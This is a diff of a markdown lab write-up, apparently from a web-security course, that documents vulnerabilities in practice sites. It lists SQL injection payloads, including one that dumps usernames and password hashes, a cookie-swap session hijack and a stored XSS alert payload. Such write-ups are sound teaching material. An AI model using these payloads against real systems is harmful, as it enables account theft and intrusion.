@@ -22,17 +22,20 @@ Vulnerability #1: SQL injection
 Description: The website is vulnerable to SQL injection at /public/salesperson.php?id=x
 
 1. /blue/public/salesperson.php?id=x, we ca use blind injection to look see the data
-    * Payload: x' union select 1, 2, 3, table_name, sleep(2) from information_schema.tables where table_name LIKE 'payload%';-- -
+
+* Payload: x' union select 1, 2, 3, table_name, sleep(2) from information_schema.tables where table_name LIKE 'payload%';-- -
 <img src="Blue-SQL injection.gif">
 2. /blue/public/staff/salespeople/show.php?id=
-    * Payload: ' union select 1, hashed_password, username, 4, 5 from users where username='jmonroe99';-- -
+
+* Payload: ' union select 1, hashed_password, username, 4, 5 from users where username='jmonroe99';-- -
     ===> Allow us to fetch all username and password
 <img src="Blue-SQL injection bonus.gif">
 
 Vulnerability #2: Session Hijacking
 
 Description: We can hijack red/public/staff/index by change the current PHP cookie on Firefox and reload the page on Chrome
-    * login as a staff in Firefox then refresh the page on Chrome
+
+* login as a staff in Firefox then refresh the page on Chrome
 <img src="Blue-SessionHijacking.gif">
 
 ## Green
@@ -40,7 +43,8 @@ Description: We can hijack red/public/staff/index by change the current PHP cook
 Vulnerability #1: XSS
 
 Description: a stored XSS can be inject through /green/public/contact.php in name and feedback input
-    * Payload: <script>alert('4lt4s is here');</script>
+
+* Payload: <script>alert('4lt4s is here');</script>
 <img src="Green-XSS.gif">
 
 Vulnerability #2: User Enumeration
